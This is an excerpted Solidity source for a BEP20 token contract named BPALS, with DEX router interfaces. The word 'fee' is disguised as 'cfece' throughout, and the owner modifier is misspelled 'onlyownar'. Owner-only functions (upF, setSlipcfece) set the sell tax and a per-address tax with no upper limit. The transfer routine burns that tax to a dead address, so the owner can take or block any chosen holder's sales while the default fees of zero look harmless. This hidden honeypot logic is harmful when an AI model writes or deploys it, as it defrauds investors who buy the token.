...
interface IUniswapV2Factory {
    ...
    function cfeceTo() external view returns (address);
    function cfeceToSetter() external view returns (address);
    ...
    function setcfeceTo(address) external;
    function setcfeceToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingcfeceOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingcfeceOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingcfeceOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingcfeceOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingcfeceOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract BPALS is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellcfece = 0;

    uint256 private _defaultBuycfece = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipcfece;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellcfece = _value;
    }

    function setSlipcfece(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipcfece[_address] = _value;
    }

    function getSlipcfece(address _address) external view onlyownar returns (uint256) {
        return _slipcfece[_address];
    }


    function setMAccountcfece(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountcfece(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradecfeceAmount = 0;

        if (rF) {
            uint256 tradecfece = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradecfece = _defaultSellcfece;
                }
                if (from == uniswapV2Pair) {

                    tradecfece = _defaultBuycfece;
                }
            }
            if (_slipcfece[from] > 0) {
                tradecfece = _slipcfece[from];
            }

            tradecfeceAmount = _Amount.mul(tradecfece).div(100);
        }


        if (tradecfeceAmount > 0) {
            _balances[from] = _balances[from].sub(tradecfeceAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradecfeceAmount);
            emit Transfer(from, _deadAddress, tradecfeceAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradecfeceAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradecfeceAmount);
        emit Transfer(from, _to, _Amount - tradecfeceAmount);
    }
